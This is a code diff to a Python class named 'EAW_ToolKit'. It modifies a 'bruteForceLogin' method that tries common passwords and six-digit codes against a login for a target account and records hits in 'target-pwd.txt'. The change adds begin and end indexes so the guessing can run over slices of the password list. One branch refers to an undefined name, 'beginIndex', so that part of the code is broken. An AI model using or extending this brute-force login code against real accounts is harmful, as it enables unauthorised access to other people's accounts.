@@ -163,12 +163,16 @@ class EAW_ToolKit:
         print ('2. Collected common passwords:', len(self.passwordList))
 
     # brute force try password 6 digits password 100000 - 999999
-    def bruteForceLogin(self, account):
-
+    def bruteForceLogin(self, account, beginIdx=-1, endIdx=-1):
+        if beginIdx == -1 or endIdx == -1:
+           begin = 0
+           end = len(self.passwordList)+1
+        else:
+            begin= beginIndex
+            end = endIdx
         targetPwdFile= open('target-pwd.txt', 'a')
-        self.readOrCreatePassList()
-
-        for pwd in self.passwordList:
+        
+        for pwd in self.passwordList[begin:end]:
             password = str(pwd)
             response = self._login(account, password)
             try:
